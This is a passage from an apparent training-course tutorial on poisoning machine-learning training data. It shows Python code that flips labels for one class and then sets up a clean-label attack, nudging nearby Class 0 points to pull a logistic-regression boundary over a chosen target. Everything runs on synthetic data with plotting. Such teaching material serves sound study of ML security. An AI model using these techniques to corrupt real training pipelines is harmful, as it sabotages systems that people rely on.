    title=f"Training Data: {poison_percentage_targeted * 100:.0f}% of Class {target_class_to_flip} Flipped to {new_label_for_flipped}",
    target_class_info=target_class_to_flip,
)

# Train a new LogisticRegression model using this poisoned data
targeted_poisoned_model = LogisticRegression(random_state=SEED)
targeted_poisoned_model.fit(X_train, y_train_targeted_poisoned)
```

---

### Evaluating the Targeted Label Attack

Evaluate Poisoned model
```python
# Predict on the original, clean test set
y_pred_targeted = targeted_poisoned_model.predict(X_test)

# Calculate accuracy on the clean test set
targeted_accuracy = accuracy_score(y_test, y_pred_targeted)
print(f"\n--- Evaluating Targeted Poisoned Model ---")
print(f"Accuracy on clean test set: {targeted_accuracy:.4f}")
print(f"Baseline accuracy was: {baseline_accuracy:.4f}")

# Display classification report
print("\nClassification Report on Clean Test Set:")
print(
    classification_report(y_test, y_pred_targeted, target_names=["Class 0", "Class 1"])
)

# Plot confusion matrix
cm_targeted = confusion_matrix(y_test, y_pred_targeted)
plt.figure(figsize=(6, 5))
sns.heatmap(
    cm_targeted,
    annot=True,
    fmt="d",
    cmap="binary",
    xticklabels=["Predicted 0", "Predicted 1"],
    yticklabels=["Actual 0", "Actual 1"],
    cbar=False,
)
plt.xlabel("Predicted Label", color=white)
plt.ylabel("True Label", color=white)
plt.title("Confusion Matrix (Targeted Poisoned Model)", fontsize=14, color=htb_green)
plt.xticks(color=hacker_grey)
plt.yticks(color=hacker_grey)
plt.show()
```

Classification Report Example
```
              precision    recall  f1-score   support
     Class 0       0.73      1.00      0.84       153
     Class 1       1.00      0.61      0.76       147
    accuracy                           0.81       300
```

We can plot the boundary of the `targeted_poisoned_model` compared to the `baseline_model` to clearly see how the boundary has shifted with the attack.
```python
# Plot the comparison of decision boundaries
plt.figure(figsize=(12, 8))

# Plot Baseline Decision Boundary (Solid Green)
Z_baseline = baseline_model.predict(mesh_points).reshape(xx.shape)
plt.contour(
    xx,
    yy,
    Z_baseline,
    levels=[0.5],
    colors=[htb_green],
    linestyles=["solid"],
    linewidths=[2.5],
)

# Plot Targeted Poisoned Decision Boundary (Dashed Red)
Z_targeted = targeted_poisoned_model.predict(mesh_points).reshape(xx.shape)
plt.contour(
    xx,
    yy,
    Z_targeted,
    levels=[0.5],
    colors=[malware_red],
    linestyles=["dashed"],
    linewidths=[2.5],
)

plt.title(
    "Comparison: Baseline vs. Targeted Poisoned Decision Boundary",
    fontsize=16,
    color=htb_green,
)
plt.xlabel("Feature 1", fontsize=12)
plt.ylabel("Feature 2", fontsize=12)

# Create legend combining data points and boundaries
handles = [
    plt.Line2D(
        [0],
        [0],
        color=htb_green,
        lw=2.5,
        linestyle="solid",
        label=f"Baseline Boundary (Acc: {baseline_accuracy:.3f})",
    ),
    plt.Line2D(
        [0],
        [0],
        color=malware_red,
        lw=2.5,
        linestyle="dashed",
        label=f"Targeted Poisoned Boundary (Acc: {targeted_accuracy:.3f})",
    ),
]

plt.legend(handles=handles, title="Boundaries & Data Points")
plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
plt.xlim(xx.min(), xx.max())
plt.ylim(yy.min(), yy.max())
plt.show()
```

We will then use our `targeted_poisoned_model` to classify these points and see how many instances of the target class (Class 1) are misclassified, and display the boundary line.
```python
# Define parameters for unseen data generation
n_unseen_samples = 500
unseen_seed = SEED + 1337

# Generate unseen data
X_unseen, y_unseen = make_blobs(
    n_samples=n_unseen_samples,
    centers=centers,
    n_features=2,
    cluster_std=1.50,
    random_state=unseen_seed,
)

# Predict labels for the unseen data using the targeted poisoned model
y_pred_unseen_poisoned = targeted_poisoned_model.predict(X_unseen)

# Calculate misclassification statistics
true_target_class_indices = np.where(y_unseen == target_class_to_flip)[0]
misclassified_target_mask = (y_unseen == target_class_to_flip) & (
    y_pred_unseen_poisoned != target_class_to_flip
)
misclassified_target_indices = np.where(misclassified_target_mask)[0]
n_true_target = len(true_target_class_indices)
n_misclassified_target = len(misclassified_target_indices)

plt.figure(figsize=(12, 8))

# Plot all unseen points, colored by the poisoned model's prediction
plt.scatter(
    X_unseen[:, 0],
    X_unseen[:, 1],
    c=y_pred_unseen_poisoned,
    cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
    edgecolors=node_black,
    s=50,
    alpha=0.7,
    label="Predicted Label",
)

# Highlight the misclassified target points
if n_misclassified_target > 0:
    plt.scatter(
        X_unseen[misclassified_target_indices, 0],
        X_unseen[misclassified_target_indices, 1],
        facecolors="none",
        edgecolors=malware_red,
        linewidths=1.5,
        marker="X",
        s=120,
        label=f"Misclassified (True Class {target_class_to_flip})",
    )

# Calculate and plot decision boundary
Z_targeted_boundary = targeted_poisoned_model.predict(mesh_points).reshape(xx.shape)
plt.contour(
    xx,
    yy,
    Z_targeted_boundary,
    levels=[0.5],
    colors=[malware_red],
    linestyles=["dashed"],
    linewidths=[2.5],
)

# Set title
plt.title(
    f"Poisoned Model Predictions & Boundary on Unseen Data\n({n_misclassified_target} of {n_true_target} Class {target_class_to_flip} samples misclassified)",
    fontsize=16,
    color=htb_green,
)
plt.xlabel("Feature 1", fontsize=12)
plt.ylabel("Feature 2", fontsize=12)

# Create legend
handles = [
    plt.Line2D(
        [0],
        [0],
        marker="o",
        color="w",
        label=f"Predicted as Class 0 (Azure)",
        markersize=10,
        markerfacecolor=azure,
        linestyle="None",
    ),
    plt.Line2D(
        [0],
        [0],
        marker="o",
        color="w",
        label=f"Predicted as Class 1 (Yellow)",
        markersize=10,
        markerfacecolor=nugget_yellow,
        linestyle="None",
    ),
    *(
        [
            plt.Line2D(
                [0],
                [0],
                marker="X",
                color="w",
                label=f"Misclassified (True Class {target_class_to_flip})",
                markersize=12,
                markeredgecolor=malware_red,
                markerfacecolor="none",
                linestyle="None",
            )
        ]
        if n_misclassified_target > 0
        else []
    ),
    plt.Line2D(
        [0],
        [0],
        color=malware_red,
        lw=2.5,
        linestyle="dashed",
        label="Decision Boundary (Targeted Model)",
    ),
]
plt.legend(handles=handles, title="Predictions, Errors & Boundary")
plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)

# Set plot limits
plt.xlim(xx.min(), xx.max())
plt.ylim(yy.min(), yy.max())

# Apply theme to background
fig = plt.gcf()
fig.set_facecolor(node_black)
ax = plt.gca()
ax.set_facecolor(node_black)

plt.show()
```
# Feature Attacks
### Clean Label Attacks
Unlike Label Flipping, Clean Label Attacks **leave ground truth labels untouched** — instead, the adversary subtly modifies _features_ of training instances to cause targeted misclassifications at inference time, while the poisoned data still appears correctly labeled.

How It Works:
	A model sorts parts into **Major Defect**, **Acceptable**, or **Minor Defect** based on measurements like length and weight.
	The attacker takes some "Major Defect" training samples and tweaks their measurements to _look like_ Acceptable parts — but keeps the "Major Defect" label.
	The model retrains, sees these weird "Major Defect" points chilling in Acceptable territory, and shifts its boundary to fit them.
	Result: real Acceptable parts now get flagged as Major Defects.

Dataset Setup and Visualization
```python
import numpy as np
import matplotlib.pyplot as plt
from sklearn.datasets import make_blobs
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import accuracy_score, classification_report, confusion_matrix
from sklearn.preprocessing import StandardScaler
from sklearn.neighbors import NearestNeighbors
from sklearn.multiclass import OneVsRestClassifier
import seaborn as sns

# Color palette
htb_green = "#9fef00"
node_black = "#141d2b"
hacker_grey = "#a4b1cd"
white = "#ffffff"
azure = "#0086ff"       # Class 0
nugget_yellow = "#ffaf00" # Class 1
malware_red = "#ff3e3e"    # Class 2
vivid_purple = "#9f00ff"   # Highlight/Accent
aquamarine = "#2ee7b6"   # Highlight/Accent

# Configure plot styles
plt.style.use("seaborn-v0_8-darkgrid")
plt.rcParams.update(
    {
        "figure.facecolor": node_black,
        "axes.facecolor": node_black,
        "axes.edgecolor": hacker_grey,
        "axes.labelcolor": white,
        "text.color": white,
        "xtick.color": hacker_grey,
        "ytick.color": hacker_grey,
        "grid.color": hacker_grey,
        "grid.alpha": 0.1,
        "legend.facecolor": node_black,
        "legend.edgecolor": hacker_grey,
        "legend.frameon": True,
        "legend.framealpha": 0.8, # Slightly transparent legend background
        "legend.labelcolor": white,
        "figure.figsize": (12, 7), # Default figure size
    }
)

# Seed for reproducibility - MUST BE 1337
SEED = 1337
np.random.seed(SEED)

print("Setup complete. Libraries imported and styles configured.")

# Generate 3-class synthetic data
n_samples = 1500
centers_3class = [(0, 6), (4, 3), (8, 6)]  # Centers for three blobs
X_3c, y_3c = make_blobs(
    n_samples=n_samples,
    centers=centers_3class,
    n_features=2,
    cluster_std=1.15, # Standard deviation of clusters
    random_state=SEED,
)

# Standardize features
scaler = StandardScaler()
X_3c_scaled = scaler.fit_transform(X_3c)

# Split data into training and testing sets, stratifying by class
X_train_3c, X_test_3c, y_train_3c, y_test_3c = train_test_split(
    X_3c_scaled, y_3c, test_size=0.3, random_state=SEED, stratify=y_3c
)

print(f"\nGenerated {n_samples} samples with 3 classes.")
print(f"Training set size: {X_train_3c.shape[0]} samples.")
print(f"Testing set size: {X_test_3c.shape[0]} samples.")
print(f"Classes: {np.unique(y_3c)}")
print(f"Feature shape: {X_train_3c.shape}")


def plot_data_multi(
    X,
    y,
    title="Multi-Class Dataset Visualization",
    highlight_indices=None,
    highlight_markers=None,
    highlight_colors=None,
    highlight_labels=None,
):
    """
    Plots a 2D multi-class dataset with class-specific colors and optional highlighting.
    Automatically ensures points marked with 'P' are plotted above all others.

    Args:
        X (np.ndarray): Feature data (n_samples, 2).
        y (np.ndarray): Labels (n_samples,).
        title (str): The title for the plot.
        highlight_indices (list | np.ndarray, optional): Indices of points in X to highlight. Defaults to None.
        highlight_markers (list, optional): Markers for highlighted points (recycled if shorter).
                                          Points with marker 'P' will be plotted on top. Defaults to ['o'].
        highlight_colors (list, optional): Edge colors for highlighted points (recycled). Defaults to [vivid_purple].
        highlight_labels (list, optional): Labels for highlighted points legend (recycled). Defaults to [''].
    """
    plt.figure(figsize=(12, 7))
    # Define colors based on the global palette for classes 0, 1, 2 (or more if needed)
    class_colors = [
        azure,
        nugget_yellow,
        malware_red,
    ]  # Extend if you have more than 3 classes
    unique_classes = np.unique(y)
    max_class_idx = np.max(unique_classes) if len(unique_classes) > 0 else -1
    if max_class_idx >= len(class_colors):
        print(
            f"{malware_red}Warning:{white} More classes ({max_class_idx + 1}) than defined colors ({len(class_colors)}). Using fallback color."
        )
        class_colors.extend([hacker_grey] * (max_class_idx + 1 - len(class_colors)))

    cmap_multi = plt.cm.colors.ListedColormap(class_colors)

    # Plot all non-highlighted points first
    plt.scatter(
        X[:, 0],
        X[:, 1],
        c=y,
        cmap=cmap_multi,
        edgecolors=node_black,
        s=50,
        alpha=0.7,
        zorder=1,  # Base layer
    )

    # Plot highlighted points on top if specified
    highlight_handles = []
    if highlight_indices is not None and len(highlight_indices) > 0:
        num_highlights = len(highlight_indices)
        # Provide defaults if None
        _highlight_markers = (
            highlight_markers
            if highlight_markers is not None
            else ["o"] * num_highlights
        )
        _highlight_colors = (
            highlight_colors
            if highlight_colors is not None
            else [vivid_purple] * num_highlights
        )
        _highlight_labels = (
            highlight_labels if highlight_labels is not None else [""] * num_highlights
        )

        for i, idx in enumerate(highlight_indices):
            if not (0 <= idx < X.shape[0]):
                print(
                    f"{malware_red}Warning:{white} Invalid highlight index {idx} skipped."
                )
                continue

            # Determine marker, edge color, and label for this point
            marker = _highlight_markers[i % len(_highlight_markers)]
            edge_color = _highlight_colors[i % len(_highlight_colors)]
            label = _highlight_labels[i % len(_highlight_labels)]

            # Determine face color based on the point's true class
            point_class = y[idx]
            try:
                face_color = class_colors[int(point_class)]
            except (IndexError, TypeError):
                print(
                    f"{malware_red}Warning:{white} Class index '{point_class}' invalid. Using fallback."
                )
                face_color = hacker_grey

            current_zorder = (
                3 if marker == "P" else 2
            )  # If marker is 'P', use zorder 3, else 2

            # Plot the highlighted point
            plt.scatter(
                X[idx, 0],
                X[idx, 1],
                facecolors=face_color,
                edgecolors=edge_color,
                marker=marker,  # Use the determined marker
                s=180,
                linewidths=2,
                alpha=1.0,
                zorder=current_zorder,  # Use the zorder determined by the marker
            )
            # Create legend handle if label exists
            if label:
                highlight_handles.append(
                    plt.Line2D(
                        [0],
                        [0],
                        marker=marker,
                        color="w",
                        label=label,
                        markerfacecolor=face_color,
                        markeredgecolor=edge_color,
                        markersize=10,
                        linestyle="None",
                        markeredgewidth=1.5,
                    )
                )

    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel("Feature 1 (Standardized)", fontsize=12)
    plt.ylabel("Feature 2 (Standardized)", fontsize=12)

    # Create class legend handles
    class_handles = []
    unique_classes_present = sorted(np.unique(y))
    for class_idx in unique_classes_present:
        try:
            int_class_idx = int(class_idx)
            class_handles.append(
                plt.Line2D(
                    [0],
                    [0],
                    marker="o",
                    color="w",
                    label=f"Class {int_class_idx}",
                    markersize=10,
                    markerfacecolor=class_colors[int_class_idx],
                    markeredgecolor=node_black,
                    linestyle="None",
                )
            )
        except (IndexError, TypeError):
            print(
                f"{malware_red}Warning:{white} Cannot create legend entry for class {class_idx}."
            )

    # Combine legends
    all_handles = class_handles + highlight_handles
    if all_handles:
        plt.legend(handles=all_handles, title="Classes & Points")

    plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
    plt.show()


# Plot the initial clean training data
print("\n--- Visualizing Clean Training Data ---")
plot_data_multi(X_train_3c, y_train_3c, title="Original Training Data (3 Classes)")
```

Output
```prompt
Setup complete. Libraries imported and styles configured.

Generated 1500 samples with 3 classes.
Training set size: 1050 samples.
Testing set size: 450 samples.
Classes: [0 1 2]
Feature shape: (1050, 2)
```
The resulting scatter plot shows three well-separated clusters — Class 0 (blue), Class 1 (yellow), and Class 2 (red)

### Baseline One-vs-Rest Logistic Regression Model
Before attacking anything, we need to know how the model performs on clean data.

Training and Visualization
```python
print("\n--- Training Baseline Model ---")
# Initialize the base estimator
# Using 'liblinear' solver as it's good for smaller datasets and handles OvR well.
# C=1.0 is the default inverse regularization strength.
base_estimator = LogisticRegression(random_state=SEED, C=1.0, solver="liblinear")

# Initialize the OneVsRestClassifier wrapper using the base estimator
baseline_model_3c = OneVsRestClassifier(base_estimator)

# Train the OvR model on the clean training data
baseline_model_3c.fit(X_train_3c, y_train_3c)
print("Baseline OvR model trained successfully.")

# Predict on the clean test set to evaluate baseline performance
y_pred_baseline_3c = baseline_model_3c.predict(X_test_3c)

# Calculate baseline accuracy
baseline_accuracy_3c = accuracy_score(y_test_3c, y_pred_baseline_3c)
print(f"Baseline 3-Class Model Accuracy on Test Set: {baseline_accuracy_3c:.4f}")

# Prepare meshgrid for plotting decision boundaries
# We create a grid of points covering the feature space
h = 0.02  # Step size in the mesh
x_min, x_max = X_train_3c[:, 0].min() - 1, X_train_3c[:, 0].max() + 1
y_min, y_max = X_train_3c[:, 1].min() - 1, X_train_3c[:, 1].max() + 1
xx_3c, yy_3c = np.meshgrid(np.arange(x_min, x_max, h), np.arange(y_min, y_max, h))
# Combine xx and yy into pairs of coordinates for prediction
mesh_points_3c = np.c_[xx_3c.ravel(), yy_3c.ravel()]

# Predict classes for each point on the meshgrid using the trained baseline model
Z_baseline_3c = baseline_model_3c.predict(mesh_points_3c)
# Reshape the predictions back into the grid shape for contour plotting
Z_baseline_3c = Z_baseline_3c.reshape(xx_3c.shape)
print("Meshgrid predictions generated for baseline model.")

# Extract baseline model parameters (weights w_k and intercepts b_k)
# The fitted OvR classifier stores its individual binary estimators in the `estimators_` attribute
try:
    if (
        hasattr(baseline_model_3c, "estimators_")
        and len(baseline_model_3c.estimators_) == 3
    ):
        estimators_base = baseline_model_3c.estimators_
        # For binary LogisticRegression with liblinear, coef_ is shape (1, n_features) and intercept_ is (1,)
        # We extract them for each of the 3 binary classifiers (0 vs Rest, 1 vs Rest, 2 vs Rest)
        w0_base = estimators_base[0].coef_[0]  # Weight vector for class 0 vs Rest
        b0_base = estimators_base[0].intercept_[0]  # Intercept for class 0 vs Rest
        w1_base = estimators_base[1].coef_[0]  # Weight vector for class 1 vs Rest
        b1_base = estimators_base[1].intercept_[0]  # Intercept for class 1 vs Rest
        w2_base = estimators_base[2].coef_[0]  # Weight vector for class 2 vs Rest
        b2_base = estimators_base[2].intercept_[0]  # Intercept for class 2 vs Rest
        print(
            "Baseline model parameters (w0, b0, w1, b1, w2, b2) extracted successfully."
        )
    else:
        # This might happen if the model didn't fit correctly or classes were dropped
        raise RuntimeError(
            "Could not extract expected number of estimators from baseline OvR model."
        )
except Exception as e:
    print(f"Error: Failed to extract baseline parameters: {e}")


def plot_decision_boundary_multi(
    X,
    y,
    Z_mesh,
    xx_mesh,
    yy_mesh,
    title="Decision Boundary",
    highlight_indices=None,
    highlight_markers=None,
    highlight_colors=None,
    highlight_labels=None,
):
    """
    Plots the decision boundary regions and data points for a multi-class classifier.
    Automatically ensures points marked with 'P' are plotted above other points.
    Explicit boundary lines are masked to only show in relevant background regions.

    Args:
        X (np.ndarray): Feature data for scatter plot (n_samples, 2).
        y (np.ndarray): Labels for scatter plot (n_samples,).
        Z_mesh (np.ndarray): Predicted classes on the meshgrid (shape matching xx_mesh).
        xx_mesh (np.ndarray): Meshgrid x-coordinates.
        yy_mesh (np.ndarray): Meshgrid y-coordinates.
        title (str): Plot title.
        highlight_indices (list | np.ndarray, optional): Indices of points in X to highlight.
        highlight_markers (list, optional): Markers for highlighted points.
                                          Points with marker 'P' will be plotted on top.
        highlight_colors (list, optional): Edge colors for highlighted points.
        highlight_labels (list, optional): Labels for highlighted points legend.
        boundary_lines (dict, optional): Dict specifying boundary lines to plot, e.g.,
            {'label': {'coeffs': (w_diff_x, w_diff_y), 'intercept': b_diff, 'color': 'color', 'style': 'linestyle'}}
    """
    plt.figure(figsize=(12, 7))  # Consistent figure size

    # Define base class colors and slightly transparent ones for contour fill
    class_colors = [azure, nugget_yellow, malware_red]  # Extend if more classes as needed
    # Add fallback colors if needed based on y and Z_mesh
    unique_classes_y = np.unique(y)
    max_class_idx_y = np.max(unique_classes_y) if len(unique_classes_y) > 0 else -1
    unique_classes_z = np.unique(Z_mesh)
    max_class_idx_z = np.max(unique_classes_z) if len(unique_classes_z) > 0 else -1
    max_class_idx = int(max(max_class_idx_y, max_class_idx_z))  # Ensure integer type

    if max_class_idx >= len(class_colors):
        print(
            f"Warning: More classes ({max_class_idx + 1}) than defined colors ({len(class_colors)}). Using fallback grey."
        )
        # Ensure enough colors exist for indexing up to max_class_idx
        needed_colors = max_class_idx + 1
        current_colors = len(class_colors)
        if current_colors < needed_colors:
            class_colors.extend([hacker_grey] * (needed_colors - current_colors))

    # Appending '60' provides approx 37% alpha in hex RGBA for contour map
    # Ensure colors used for cmap match the number of classes exactly
    light_colors = [
        c + "60" if len(c) == 7 and c.startswith("#") else c
        for c in class_colors[: max_class_idx + 1]
    ]
    cmap_light = plt.cm.colors.ListedColormap(light_colors)

    # Plot the decision boundary contour fill
    plt.contourf(
        xx_mesh,
        yy_mesh,
        Z_mesh,
        cmap=cmap_light,
        alpha=0.6,
        zorder=0,  # Ensure contour is lowest layer
    )

    # Plot the data points
    # Ensure cmap for points matches number of classes in y
    cmap_bold = (
        plt.cm.colors.ListedColormap(class_colors[: int(max_class_idx_y) + 1])
        if max_class_idx_y >= 0
        else plt.cm.colors.ListedColormap(class_colors[:1])
    )
    plt.scatter(
        X[:, 0],
        X[:, 1],
        c=y,
        cmap=cmap_bold,
        edgecolors=node_black,
        s=50,
        alpha=0.8,
        zorder=1,  # Points above contour
    )

    # Plot highlighted points if any
    highlight_handles = []
    if highlight_indices is not None and len(highlight_indices) > 0:
        num_highlights = len(highlight_indices)
        # Provide defaults if None
        _highlight_markers = (
            highlight_markers
            if highlight_markers is not None
            else ["o"] * num_highlights
        )
        _highlight_colors = (
            highlight_colors
            if highlight_colors is not None
            else [vivid_purple] * num_highlights
        )
        _highlight_labels = (
            highlight_labels if highlight_labels is not None else [""] * num_highlights
        )

        for i, idx in enumerate(highlight_indices):
            # Check index validity gracefully
            if not (0 <= idx < X.shape[0]):
                print(
                    f"Warning: Invalid highlight index {idx} skipped."
                )
                continue

            # Determine marker, edge color, and label for this point
            marker = _highlight_markers[i % len(_highlight_markers)]  # Get the marker
            edge_color = _highlight_colors[i % len(_highlight_colors)]
            label = _highlight_labels[i % len(_highlight_labels)]

            # Determine face color based on the point's true class from y
            try:
                # Ensure point_class is a valid integer index for class_colors
                point_class = int(y[idx])
                if not (0 <= point_class < len(class_colors)):
                    raise IndexError
                face_color = class_colors[point_class]
            except (IndexError, ValueError, TypeError):
                print(
                    f"Warning: Class index '{y[idx]}' invalid for highlighted point {idx}. Using fallback."
                )
                face_color = hacker_grey  # Fallback

            current_zorder = (
                3 if marker == "P" else 2
            )  # If marker is 'P', use zorder 3, else 2

            # Plot the highlighted point
            plt.scatter(
                X[idx, 0],
                X[idx, 1],
                facecolors=face_color,
                edgecolors=edge_color,
                marker=marker,  # Use the determined marker
                s=180,
                linewidths=2,
                alpha=1.0,  # Make highlighted points fully opaque
                zorder=current_zorder,  # Use the zorder determined by the marker
            )
            # Create legend handle if label exists
            if label:
                # Use Line2D for better control over legend marker appearance
                highlight_handles.append(
                    plt.Line2D(
                        [0],
                        [0],
                        marker=marker,
                        color="w",
                        label=label,
                        markerfacecolor=face_color,
                        markeredgecolor=edge_color,
                        markersize=10,
                        linestyle="None",
                        markeredgewidth=1.5,
                    )
                )

    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel("Feature 1 (Standardized)", fontsize=12)
    plt.ylabel("Feature 2 (Standardized)", fontsize=12)

    # Create class legend handles (based on unique classes in y)
    class_handles = []
    # Check if y is not empty before finding unique classes
    if y.size > 0:
        unique_classes_present_y = sorted(np.unique(y))
        for class_idx in unique_classes_present_y:
            try:
                int_class_idx = int(class_idx)
                # Check if index is valid for the potentially extended class_colors
                if 0 <= int_class_idx < len(class_colors):
                    class_handles.append(
                        plt.Line2D(
                            [0],
                            [0],
                            marker="o",
                            color="w",
                            label=f"Class {int_class_idx}",
                            markersize=10,
                            markerfacecolor=class_colors[int_class_idx],
                            markeredgecolor=node_black,
                            linestyle="None",
                        )
                    )
                else:
                    print(
                        f"Warning: Cannot create class legend entry for class {int_class_idx}, color index out of bounds after potential extension."
                    )
            except (ValueError, TypeError):
                print(
                    f"Warning: Cannot create class legend entry for non-integer class {class_idx}."
                )
    else:
        print(
            f"Info: No data points (y is empty), skipping class legend entries."
        )

    # Combine legends
    all_handles = class_handles + highlight_handles
    if all_handles:  # Only show legend if there's something to legend
        plt.legend(handles=all_handles, title="Classes, Points & Boundaries")

    plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
    # Ensure plot limits strictly match the meshgrid range used for contourf
    plt.xlim(xx_mesh.min(), xx_mesh.max())
    plt.ylim(yy_mesh.min(), yy_mesh.max())
    plt.show()


# Plot the decision boundary for the baseline model using the pre-calculated Z_baseline_3c
print("\n--- Visualizing Baseline Model Decision Boundaries ---")
plot_decision_boundary_multi(
    X_train_3c,  # Training data points
    y_train_3c,  # Training labels
    Z_baseline_3c,  # Meshgrid predictions from baseline model
    xx_3c,  # Meshgrid x coordinates
    yy_3c,  # Meshgrid y coordinates
    title=f"Baseline Model Decision Boundaries (3 Classes)\nTest Accuracy: {baseline_accuracy_3c:.4f}",
)
```
The resulting plot shows the decision regions — each colored zone is where the model predicts that class. Where the colors meet = the decision boundaries.

### Identifying a Target

We're picking a Class 1 (Yellow) data point that sits _just barely_ on the correct side of the decision boundary. Why? Because if we poison the training data and the boundary shifts even a tiny bit, this point gets misclassified as Class 0 (Blue).

TLDR
	Imagine a fence separating yellow and blue sheep. We're looking for a yellow sheep standing right next to the fence. If someone nudges the fence just a little, that sheep ends up on the blue side without us ever changing the sheep's color (label). That's the "clean label" trick.

How it works
	We define a score difference function between Class 0 and Class 1:
	f₀₁(x) = (w₀ − w₁)ᵀx + (b₀ − b₁)
		f₀₁ < 0 → the model sees the point as Class 1 (correct side)
		f₀₁ = 0 → the decision boundary itself
		f₀₁ > 0 → the model sees the point as Class 0

Identify Target
```python
print("\n--- Selecting Target Point ---")
# We use the baseline parameters w0_base, b0_base, w1_base, b1_base extracted earlier
# Calculate the difference vector and intercept for the 0-vs-1 boundary
w_diff_01_base = w0_base - w1_base
b_diff_01_base = b0_base - b1_base
print(f"Boundary vector (w0-w1): {w_diff_01_base}")
print(f"Intercept difference (b0-b1): {b_diff_01_base}")

# Identify indices of all Class 1 points in the original clean training set
class1_indices_train = np.where(y_train_3c == 1)[0]

if len(class1_indices_train) == 0:
    raise ValueError(
        "CRITICAL: No Class 1 points found in the training data. Cannot select target."
    )
else:
    print(f"Found {len(class1_indices_train)} Class 1 points in the training set.")

# Get the feature vectors for only the Class 1 points
X_class1_train = X_train_3c[class1_indices_train]

# Calculate the decision function f_01(x) = (w0-w1)^T x + (b0-b1) for these Class 1 points
# A negative value means the point is on the Class 1 side of the 0-vs-1 boundary
decision_values_01 = X_class1_train @ w_diff_01_base + b_diff_01_base

# Find indices within the subset of Class 1 points that are correctly classified (f_01 < 0)
class1_on_correct_side_indices_relative = np.where(decision_values_01 < 0)[0]

if len(class1_on_correct_side_indices_relative) == 0:
    # This case is unlikely if the baseline model has decent accuracy, but handle it.
    print(
        f"{malware_red}Warning:{white} No Class 1 points found on the expected side (f_01 < 0) of the 0-vs-1 baseline boundary."
    )
    print(
        "Selecting the Class 1 point with the minimum absolute decision value instead."
    )
    # Find index (relative to class1 subset) with the smallest absolute distance to boundary
    target_point_index_relative = np.argmin(np.abs(decision_values_01))
else:
    # Among the correctly classified points, find the one closest to the boundary
    # This corresponds to the maximum (least negative) decision value
    target_point_index_relative = class1_on_correct_side_indices_relative[
        np.argmax(decision_values_01[class1_on_correct_side_indices_relative])
    ]

# Map the relative index (within the class1 subset) back to the absolute index in the original X_train_3c array
target_point_index_absolute = class1_indices_train[target_point_index_relative]

# Retrieve the target point's features and true label
X_target = X_train_3c[target_point_index_absolute]
y_target = y_train_3c[
    target_point_index_absolute
]  # Should be 1 based on selection logic

# Sanity Check: Verify the chosen point's class and baseline prediction
target_baseline_pred = baseline_model_3c.predict(X_target.reshape(1, -1))[0]
target_decision_value = decision_values_01[target_point_index_relative]

print(f"\nSelected Target Point Index (absolute): {target_point_index_absolute}")
print(f"Target Point Features: {X_target}")
print(f"Target Point True Label (y_target): {y_target}")
print(f"Target Point Baseline Prediction: {target_baseline_pred}")
print(
    f"Target Point Baseline 0-vs-1 Decision Value (f_01): {target_decision_value:.4f}"
)

if y_target != 1:
    print(
        f"Error: Selected target point does not have label 1! Check logic."
    )
if target_baseline_pred != y_target:
    print(
        f"Warning: Baseline model actually misclassifies the chosen target point ({target_baseline_pred}). Attack might trivially succeed or have unexpected effects."
    )
if target_decision_value >= 0:
    print(
        f"Warning: Selected target point has f_01 >= 0 ({target_decision_value:.4f}), meaning it wasn't on the Class 1 side of the 0-vs-1 boundary. Check logic or baseline model."
    )

# Visualize the data highlighting the selected target point near the boundary
print("\n--- Visualizing Training Data with Target Point ---")
plot_data_multi(
    X_train_3c,
    y_train_3c,
    title="Training Data Highlighting the Target Point (Near Boundary)",
    highlight_indices=[target_point_index_absolute],
    highlight_markers=["P"],  # 'P' for Plus sign marker (Target)
    highlight_colors=[white],  # White edge color for visibility
    highlight_labels=[f"Target (Class {y_target}, Idx {target_point_index_absolute})"],
)
```

Result
	The code selects **index 373** as our target:

|Property|Value|
|---|---|
|Features|`[-0.551, -0.367]`|
|True Label|1 (Yellow)|
|Baseline Prediction|1 (correct)|
|Decision Value (f₀₁)|**-0.0493**|

### The Clean Label Attack

TLDR
	We find the 5 closest Class 0 (Blue) neighbors to our target point, nudge them just across the decision boundary into Class 1 territory, but keep their labels as Class 0. When the model retrains on this contradictory data, it's forced to redraw the boundary — swallowing our target point in the process.

Step 1: Find the Nearest Class 0 Neighbors
```python
print("\n--- Identifying Class 0 Neighbors to Perturb ---")
n_neighbors_to_perturb = 5 # Hyperparameter: How many neighbors to modify

# Find indices of all Class 0 points in the original training set
class0_indices_train = np.where(y_train_3c == 0)[0]

if len(class0_indices_train) == 0:
    raise ValueError("CRITICAL: No Class 0 points found. Cannot find neighbors to perturb.")
else:
    print(f"Found {len(class0_indices_train)} Class 0 points in the training set.")

# Get features of only Class 0 points
X_class0_train = X_train_3c[class0_indices_train]

# Sanity check to ensure we don't request more neighbors than available
if n_neighbors_to_perturb > len(X_class0_train):
    print(f"Warning: Requested {n_neighbors_to_perturb} neighbors, but only {len(X_class0_train)} Class 0 points available. Using all available.")
    n_neighbors_to_perturb = len(X_class0_train)

if n_neighbors_to_perturb == 0:
    raise ValueError("No Class 0 neighbors can be selected to perturb (n_neighbors_to_perturb=0). Cannot proceed.")

# Initialize and fit NearestNeighbors on the Class 0 data points
# We use the default Euclidean distance ('minkowski' with p=2)
nn_finder = NearestNeighbors(n_neighbors=n_neighbors_to_perturb, algorithm='auto')
nn_finder.fit(X_class0_train)

# Find the indices (relative to X_class0_train) and distances of the k nearest Class 0 neighbors to X_target
distances, indices_relative = nn_finder.kneighbors(X_target.reshape(1, -1))

# Map the relative indices found within X_class0_train back to the original indices in X_train_3c
neighbor_indices_absolute = class0_indices_train[indices_relative.flatten()]
# Get the original feature vectors of these neighbors (needed for perturbation)
X_neighbors = X_train_3c[neighbor_indices_absolute]

# Output the findings for verification
print(f"\nTarget Point Index: {target_point_index_absolute} (True Class {y_target})")
print(f"Identified {len(neighbor_indices_absolute)} closest Class 0 neighbors to perturb:")
print(f"  Indices in X_train_3c: {neighbor_indices_absolute}")
print(f"  Distances to target: {distances.flatten()}")

# Sanity check: Ensure the target itself wasn't accidentally included (e.g., if it was mislabeled or data is unusual)
if target_point_index_absolute in neighbor_indices_absolute:
